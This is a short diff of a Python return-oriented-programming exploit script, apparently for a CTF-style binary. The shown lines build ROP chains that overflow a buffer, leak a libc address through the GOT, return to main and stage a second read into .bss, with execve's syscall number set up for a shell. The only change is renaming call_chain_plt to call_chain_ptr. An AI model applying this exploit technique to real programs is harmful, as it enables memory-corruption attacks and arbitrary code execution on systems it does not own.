@@ -8,7 +8,7 @@ addr_stage = rop.section('.bss') + 0x400
 nr_execve = 59
 
 buf = rop.retfill(offset)
-buf += rop.call_chain_plt(
+buf += rop.call_chain_ptr(
     ['write', 1, rop.got('__libc_start_main'), 8]
 )
 buf += rop.p(rop.addr('main'))
@@ -20,7 +20,7 @@ ref_addr = p.read_p64()
 print "[+] ref_addr = %x" % ref_addr
 
 buf = rop.retfill(offset)
-buf += rop.call_chain_plt(
+buf += rop.call_chain_ptr(
     ['write', 1, ref_addr, 0x200000],
     ['read', 0, addr_stage, 100],
 )
